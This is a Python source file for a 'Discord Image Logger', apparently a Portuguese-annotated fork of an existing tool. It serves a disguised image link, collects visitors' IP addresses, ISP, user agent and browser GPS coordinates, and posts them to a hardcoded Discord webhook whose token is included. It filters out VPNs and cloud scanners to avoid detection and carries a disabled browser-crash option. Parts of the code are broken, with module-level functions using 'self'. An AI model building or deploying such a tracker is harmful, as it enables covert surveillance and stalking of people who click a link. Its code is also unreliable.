# Discord Image Logger (Complete Edition)
# By DeKrypt | https://github.com/dekrypted
# Geolocation Enhancements by [Seu Nome]

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback
import requests
import base64
import httpagentparser

__app__ = "Discord Image Logger"
__description__ = "Advanced IP/Geo-Logging Utility"
__version__ = "v3.0"
__author__ = "DeKrypt"

# ===================== CONFIGURAÇÃO PRINCIPAL =====================
config = {
    # -------------------- CONFIG BASE --------------------
    "webhook": "https://discord.com/api/webhooks/1342206713813667992/ZrCTV80NToSOpDcxy7KXmUB6wIlwYfTsKwGoGADV91vLagXObWDzp9csNQbmCmAUe04G",
    "image": "https://i.imgur.com/3kl7JMQ.png",
    "imageArgument": True,

    # ------------------ PERSONALIZAÇÃO -------------------
    "username": "Geo Logger",
    "color": 0x1ABC9C,
    
    # ------------------- OPÇÕES AVANÇADAS -------------------
    "crashBrowser": {
        "enabled": False,
        "method": "RAM",  # RAM/LOOP
        "message": "This browser has been pwned"
    },
    
    "accurateLocation": {
        "enabled": True,
        "timeout": 10  # Segundos
    },

    "message": {
        "enabled": True,
        "text": "Your IP and location have been logged.",
        "richEmbed": True
    },

    "vpnCheck": {
        "enabled": True,
        "blockVPNs": True,
        "alert": True
    },

    "antiBot": {
        "enabled": True,
        "blockHosting": True,
        "blockCloud": True
    },

    "redirect": {
        "enabled": False,
        "url": "https://google.com"
    }
}

# ===================== SISTEMA DE SEGURANÇA =====================
BLACKLISTED_IPS = ("27.", "104.", "143.", "164.")  # Bloqueio de ASNs suspeitos
CLOUD_PROVIDERS = ("aws", "google", "azure", "cloudflare")

# ===================== FUNÇÕES AUXILIARES =====================
def parse_ip(headers):
    return (
        headers.get("x-forwarded-for") or 
        headers.get("x-real-ip") or 
        "N/A"
    )

def get_geo_data(ip):
    try:
        response = requests.get(
            f"http://ip-api.com/json/{ip}?fields=status,message,continent,country,regionName,city,zip,lat,lon,isp,org,as,mobile,proxy,hosting",
            timeout=15
        )
        return response.json()
    except Exception as e:
        return {"error": str(e)}

def get_gps_coords(query):
    try:
        coords = base64.b64decode(query["g"]).decode()
        lat, lon = coords.split(',')
        return {
            "latitude": float(lat),
            "longitude": float(lon),
            "accuracy": "High (GPS)",
            "source": "Browser Geolocation"
        }
    except:
        return None

# ===================== SISTEMA DE RELATÓRIOS =====================
def generate_embed(ip, geo_data, gps_data, user_agent):
    # Detecção do sistema
    os, browser = httpagentparser.simple_detect(user_agent) if user_agent else ("Unknown", "Unknown")
    
    # Construção do embed
    embed = {
        "username": config["username"],
        "embeds": [{
            "title": "🌍 Nova Atividade Detectada",
            "color": config["color"],
            "fields": [
                {"name": "🌐 IP Address", "value": f"```{ip}```", "inline": False},
                {"name": "📍 Geolocalização", "value": self._build_geo_field(geo_data, gps_data), "inline": False},
                {"name": "🖥️ Sistema", "value": f"**OS:** {os}\n**Browser:** {browser}", "inline": True},
                {"name": "📡 Rede", "value": self._build_network_field(geo_data), "inline": True}
            ],
            "footer": {"text": f"User Agent: {user_agent}"}
        }]
    }
    
    if gps_data:
        embed["embeds"][0]["thumbnail"] = {"url": f"https://maps.googleapis.com/maps/api/staticmap?center={gps_data['latitude']},{gps_data['longitude']}&zoom=13&size=600x300"}
    
    return embed

def _build_geo_field(self, geo_data, gps_data):
    if gps_data:
        return (
            f"**Precisão:** {gps_data['accuracy']}\n"
            f"**Coordenadas:** [{gps_data['latitude']}, {gps_data['longitude']}]"
            f"(https://www.google.com/maps/place/{gps_data['latitude']}+{gps_data['longitude']})\n"
            f"**Fonte:** {gps_data['source']}"
        )
    return (
        f"**País:** {geo_data.get('country', 'N/A')}\n"
        f"**Cidade:** {geo_data.get('city', 'N/A')}\n"
        f"**Coordenadas:** [{geo_data.get('lat', 'N/A')}, {geo_data.get('lon', 'N/A')}]"
    )

def _build_network_field(self, geo_data):
    return (
        f"**ISP:** {geo_data.get('isp', 'N/A')}\n"
        f"**ASN:** {geo_data.get('as', 'N/A')}\n"
        f"**VPN:** {'✅' if geo_data.get('proxy') else '❌'}"
    )

# ===================== SERVIDOR PRINCIPAL =====================
class GeoLoggerAPI(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Processamento da URL
            parsed_url = parse.urlsplit(self.path)
            query = parse.parse_qs(parsed_url.query)
            
            # Configuração dinâmica
            image_url = self._get_image_url(query)
            ip_address = parse_ip(self.headers)
            user_agent = self.headers.get("User-Agent", "Unknown")
            
            # Verificações de segurança
            if self._is_blocked(ip_address, user_agent):
                return self._handle_blocked_request(image_url)
            
            # Coleta de dados
            geo_data = get_geo_data(ip_address)
            gps_data = self._get_gps_data(query)
            
            # Geração de resposta
            self._send_response(image_url)
            self._log_data(ip_address, user_agent, geo_data, gps_data)
            
        except Exception as e:
            self._handle_error(e)

    def _get_image_url(self, query):
        if config["imageArgument"] and (query.get("url") or query.get("id")):
            return base64.b64decode((query.get("url")[0] or query.get("id")[0]).encode()).decode()
        return config["image"]

    def _is_blocked(self, ip, user_agent):
        if any(ip.startswith(prefix) for prefix in BLACKLISTED_IPS):
            return True
        if config["antiBot"]["enabled"]:
            return any(provider in user_agent.lower() for provider in CLOUD_PROVIDERS)
        return False

    def _handle_blocked_request(self, image_url):
        self.send_response(302)
        self.send_header("Location", image_url)
        self.end_headers()

    def _get_gps_data(self, query):
        if config["accurateLocation"]["enabled"] and "g" in query:
            return get_gps_coords(query)
        return None

    def _send_response(self, image_url):
        content = self._build_response_content(image_url)
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(content.encode())

    def _build_response_content(self, image_url):
        if config["message"]["enabled"]:
            return self._build_message_content()
        return f'''<style>body{{margin:0;padding:0}}
                  div.img{{background:url('{image_url}');background-size:contain;width:100vw;height:100vh;}}</style>
                  <div class="img">{self._get_geo_script()}</div>'''

    def _build_message_content(self):
        message = config["message"]["text"]
        if config["message"]["richEmbed"]:
            message += "\n\n**Detalhes Técnicos:**\n- IP: {ip}\n- ISP: {isp}"
        return message

    def _get_geo_script(self):
        if config["accurateLocation"]["enabled"]:
            return '''<script>
                navigator.geolocation.getCurrentPosition(p => {
                    const coords = btoa(p.coords.latitude + ',' + p.coords.longitude)
                    window.location.search += '&g=' + coords
                }, null, {timeout:10000})
                </script>'''
        return ""

    def _log_data(self, ip, user_agent, geo_data, gps_data):
        embed = generate_embed(ip, geo_data, gps_data, user_agent)
        requests.post(config["webhook"], json=embed)

    def _handle_error(self, error):
        self.send_response(500)
        self.end_headers()
        error_report = {
            "username": config["username"],
            "content": "⚠️ **Erro no Logger**",
            "embeds": [{
                "description": f"```{traceback.format_exc()}```",
                "color": 0xFF0000
            }]
        }
        requests.post(config["webhook"], json=error_report)

# ===================== INICIALIZAÇÃO =====================
if __name__ == "__main__":
    from http.server import HTTPServer
    server = HTTPServer(("0.0.0.0", 8080), GeoLoggerAPI)
    print(f"Servidor iniciado em http://0.0.0.0:8080")
    server.serve_forever()
